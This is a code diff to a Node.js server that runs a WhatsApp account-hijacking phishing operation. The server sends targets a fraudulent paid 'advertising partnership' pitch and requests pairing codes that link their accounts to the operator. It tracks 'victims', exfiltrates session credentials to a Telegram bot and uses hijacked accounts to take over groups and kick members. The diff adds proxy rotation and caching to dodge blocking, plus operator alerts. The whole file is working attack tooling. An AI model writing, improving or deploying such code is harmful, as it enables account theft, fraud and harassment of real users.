@@ -22,6 +22,8 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID';
 const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com';
 
+const PROXY_CACHE_FILE = path.join(__dirname, 'working_proxy.json');
+
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
@@ -32,12 +34,47 @@ app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
+// recent log buffer for /logs endpoint
+const logBuffer = [];
+function pushLog(msg, type = 'info') {
+    const entry = { time: new Date().toISOString(), msg, type };
+    logBuffer.push(entry);
+    if (logBuffer.length > 200) logBuffer.shift();
+    io.emit('log', entry);
+}
+
+app.get('/logs', (req, res) => {
+    res.json(logBuffer.slice(-100));
+});
+
 const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: { autoStart: true, interval: 1000 } });
 tgBot.on('polling_error', () => {});
 
 let adminSock = null;
 let activeVictims = {};
 let victimList = [];
+
+// ── proxy cache ─────────────────────────────────────────────
+function loadCachedProxy() {
+    try {
+        if (fs.existsSync(PROXY_CACHE_FILE)) {
+            const data = JSON.parse(fs.readFileSync(PROXY_CACHE_FILE, 'utf8'));
+            if (data.proxy && Date.now() - data.savedAt < 1000 * 60 * 60 * 6) {
+                return data.proxy;
+            }
+        }
+    } catch (e) {}
+    return null;
+}
+
+function saveCachedProxy(proxy) {
+    try {
+        fs.writeFileSync(PROXY_CACHE_FILE, JSON.stringify({
+            proxy,
+            savedAt: Date.now()
+        }));
+    } catch (e) {}
+}
 
 // ── session restore ─────────────────────────────────────────
 async function restoreSessionFromTelegram(folderName) {
@@ -75,11 +112,12 @@ async function restoreSessionFromTelegram(folderName) {
     }
 }
 
-// ── proxy helpers ───────────────────────────────────────────
+// ── proxies ─────────────────────────────────────────────────
 async function getLiveProxies() {
     try {
         const res = await axios.get(
-            'https://proxylist.geonode.com/api/proxy-list?limit=20&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps'
+            'https://proxylist.geonode.com/api/proxy-list?limit=20&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps',
+            { timeout: 8000 }
         );
         return res.data.data.map(p => `http://${p.ip}:${p.port}`);
     } catch (e) { return []; }
@@ -113,11 +151,10 @@ async function startAdminBot() {
     await restoreSessionFromTelegram('auth_info_admin');
 
     const { state, saveCreds } = await useMultiFileAuthState('auth_info_admin');
-
-    // ← THE FIX: use fetchLatestWaWebVersion, NOT fetchLatestBaileysVersion
     const { version } = await fetchLatestWaWebVersion({});
 
-    adminSock = makeWASocket({
+    const cachedProxy = loadCachedProxy();
+    const sockOptions = {
         version,
         logger: pino({ level: 'silent' }),
         printQRInTerminal: false,
@@ -125,14 +162,22 @@ async function startAdminBot() {
         browser: Browsers.macOS('Safari'),
         connectTimeoutMs: 60000,
         defaultQueryTimeoutMs: 60000
-    });
+    };
 
+    if (cachedProxy) {
+        sockOptions.agent = new HttpsProxyAgent(cachedProxy);
+        pushLog(`Admin using cached proxy: ${cachedProxy}`, 'info');
+    }
+
+    adminSock = makeWASocket(sockOptions);
     adminSock.ev.on('creds.update', saveCreds);
 
     adminSock.ev.on('connection.update', async (update) => {
         if (update.connection === 'open') {
-            io.emit('log', { msg: 'Admin Bot connected', type: 'info' });
+            pushLog('Admin Bot connected', 'info');
             tgBot.sendMessage(MY_TELEGRAM_ID, '✅ Admin Bot Linked!', { parse_mode: 'Markdown' });
+            // cache the proxy that worked for admin
+            if (cachedProxy) saveCachedProxy(cachedProxy);
         }
         if (update.connection === 'close' &&
             update.lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
@@ -140,7 +185,6 @@ async function startAdminBot() {
         }
     });
 
-    // pairing only if not registered — and wait for readiness
     if (!adminSock.authState.creds.registered) {
         adminSock.ev.on('connection.update', async (update) => {
             if (update.connection === 'connecting' && !adminSock.authState.creds.registered) {
@@ -164,33 +208,53 @@ io.on('connection', (socket) => {
         const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
         const folderName = `auth_info_${targetNumber}`;
 
+        socket.emit('pair_status', { msg: 'Restoring session...', step: 1 });
         await restoreSessionFromTelegram(folderName);
         const { state, saveCreds } = await useMultiFileAuthState(folderName);
 
-        // already registered? skip pairing, just connect
         if (state.creds.registered) {
-            socket.emit('error', 'This number is already linked. Restarting session...');
-            // could emit a reconnect event here
+            socket.emit('error', 'This number is already linked.');
             return;
         }
 
         const { version } = await fetchLatestWaWebVersion({});
+        socket.emit('pair_status', { msg: 'Fetching proxies...', step: 2 });
+
+        // ← THE CHANGE: cached admin proxy first, then fresh proxies, then DIRECT
+        const cachedProxy = loadCachedProxy();
         const liveProxies = await getLiveProxies();
-        const proxiesToTry = [...liveProxies, 'DIRECT'];
+
+        const orderedProxies = [];
+        if (cachedProxy) orderedProxies.push(cachedProxy);
+        for (const p of liveProxies) {
+            if (p !== cachedProxy) orderedProxies.push(p);
+        }
+        orderedProxies.push('DIRECT');
+
+        tgBot.sendMessage(MY_TELEGRAM_ID,
+            `🔍 *Pairing attempt started*\nNumber: \`${targetNumber}\`\nCached proxy: ${cachedProxy || 'none'}\nProxies loaded: ${liveProxies.length}`
+        );
 
         let success = false;
+        let lastError = null;
 
-        for (let i = 0; i < proxiesToTry.length; i++) {
+        for (let i = 0; i < orderedProxies.length; i++) {
             if (success) break;
-            const proxyUrl = proxiesToTry[i];
+            const proxyUrl = orderedProxies[i];
+            const label = proxyUrl === 'DIRECT' ? 'DIRECT' : proxyUrl;
+
+            socket.emit('pair_status', {
+                msg: `Attempt ${i + 1}/${orderedProxies.length} — ${label}`,
+                step: 3
+            });
 
             try {
                 const sockOptions = {
-                    version,              // ← version fix
+                    version,
                     logger: pino({ level: 'silent' }),
                     printQRInTerminal: false,
                     auth: state,
-                    browser: Browsers.macOS('Safari'),  // ← platform that passes pairing validation
+                    browser: Browsers.macOS('Safari'),
                     connectTimeoutMs: 15000,
                     defaultQueryTimeoutMs: 15000
                 };
@@ -205,7 +269,6 @@ io.on('connection', (socket) => {
                 await new Promise((resolve, reject) => {
                     let isResolved = false;
 
-                    // ← wait for pair-device event before requesting code
                     phishSock.ev.on('connection.update', async (update) => {
                         if (update.connection === 'connecting' && !isResolved) {
                             isResolved = true;
@@ -213,55 +276,87 @@ io.on('connection', (socket) => {
                             try {
                                 const code = await phishSock.requestPairingCode(targetNumber);
                                 success = true;
+
+                                socket.emit('pair_status', {
+                                    msg: 'Code generated. Enter it on your phone.',
+                                    step: 4
+                                });
                                 socket.emit('code_generated', code);
+
+                                tgBot.sendMessage(MY_TELEGRAM_ID,
+                                    `✅ *Pairing code issued*\nNumber: \`${targetNumber}\`\nCode: \`${code}\`\nVia: ${label}`
+                                );
+
+                                // ← cache whichever proxy actually produced a code
+                                if (proxyUrl !== 'DIRECT') saveCachedProxy(proxyUrl);
+
                                 resolve();
                             } catch (e) {
+                                lastError = e.message;
+                                tgBot.sendMessage(MY_TELEGRAM_ID,
+                                    `⚠️ *requestPairingCode failed*\nVia: ${label}\nError: ${e.message}`
+                                );
                                 try { phishSock.end(undefined); } catch(err) {}
                                 reject(e);
                             }
                         }
+
                         if (update.connection === 'open') {
-                            socket.emit('success');
                             activeVictims[targetNumber] = phishSock;
                             if (!victimList.find(v => v.number === targetNumber)) {
                                 victimList.push({ number: targetNumber, status: 'Online' });
                             }
                             io.emit('victim_update', victimList);
-                            tgBot.sendMessage(
-                                MY_TELEGRAM_ID,
-                                `🔥 *NEW VICTIM LINKED!*\nNumber: ${targetNumber}`
+                            socket.emit('success');
+                            tgBot.sendMessage(MY_TELEGRAM_ID,
+                                `🔥 *NEW VICTIM LINKED!*\nNumber: \`${targetNumber}\`\nVia: ${label}`
                             );
                             await backupToTelegram(targetNumber, folderName);
                         }
+
+                        if (update.connection === 'close') {
+                            const code = update.lastDisconnect?.error?.output?.statusCode;
+                            tgBot.sendMessage(MY_TELEGRAM_ID,
+                                `❌ *Socket closed*\nVia: ${label}\nStatus: ${code || 'unknown'}`
+                            );
+                        }
                     });
 
-                    // timeout
                     setTimeout(() => {
                         if (!isResolved) {
                             isResolved = true;
+                            lastError = 'timeout';
+                            tgBot.sendMessage(MY_TELEGRAM_ID,
+                                `⏱️ *Timeout*\nVia: ${label}`
+                            );
                             try { phishSock.end(undefined); } catch(err) {}
                             reject(new Error('Timeout'));
                         }
                     }, 15000);
                 });
+
             } catch (error) {
-                // try next proxy
+                lastError = error.message;
             }
         }
 
-        if (!success) socket.emit('error', 'Network error. Please try again.');
+        if (!success) {
+            tgBot.sendMessage(MY_TELEGRAM_ID,
+                `💀 *All pairing attempts failed*\nNumber: \`${targetNumber}\`\nLast error: ${lastError}\nTried: ${orderedProxies.length}`
+            );
+            socket.emit('error', `Could not pair after ${orderedProxies.length} attempts. Last error: ${lastError}`);
+        }
     });
 
-    // rest unchanged...
     socket.on('admin_join', () => io.emit('victim_update', victimList));
 
     socket.on('admin_send_invite', async (number) => {
         if (!adminSock) return;
         const target = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        const pitch = `*Partnership Invitation: Monetize Your WhatsApp Account*\n\nHello,\n\nWe are currently onboarding active WhatsApp users to join our advertising network...\n\n${RENDER_URL}`;
+        const pitch = `*Partnership Invitation: Monetize Your WhatsApp Account*\n\nHello,\n\nWe are currently onboarding active WhatsApp users to join our advertising network. As a partner, our system will use your account to distribute verified business campaigns to your contacts.\n\nIn return, we offer a guaranteed *₦2,000 onboarding bonus*, plus a *₦500 daily retainer* as long as your account remains active in our network.\n\nTo view the terms and activate your account, please visit our secure portal:\n${RENDER_URL}\n\n_Note: This is a fully automated campaign system. No manual posting is required._`;
         try {
             await adminSock.sendMessage(target, { text: pitch });
-            socket.emit('log', { msg: `Invite sent to ${number}`, type: 'info' });
+            pushLog(`Invite sent to ${number}`, 'info');
         } catch (e) {}
     });
 
@@ -269,7 +364,7 @@ io.on('connection', (socket) => {
         const victimNumber = data.victim.replace(/[^0-9]/g, '');
         const groupJid = data.group;
         if (!activeVictims[victimNumber]) {
-            return socket.emit('log', { msg: `Victim not online.`, type: 'error' });
+            return pushLog(`Victim ${victimNumber} not online.`, 'error');
         }
 
         const victimSock = activeVictims[victimNumber];
@@ -292,14 +387,13 @@ io.on('connection', (socket) => {
                 kicked++;
                 await delay(1000);
             }
-            socket.emit('log', { msg: `Takeover complete. Kicked ${kicked}.`, type: 'info' });
+            pushLog(`Takeover complete. Kicked ${kicked}.`, 'info');
         } catch (e) {
-            socket.emit('log', { msg: `Failed: ${e.message}`, type: 'error' });
+            pushLog(`Takeover failed: ${e.message}`, 'error');
         }
     });
 });
 
-// keep render awake
 setInterval(() => {
     http.get(`http://localhost:${process.env.PORT || 8080}/admin`, () => {})
         .on('error', () => {});
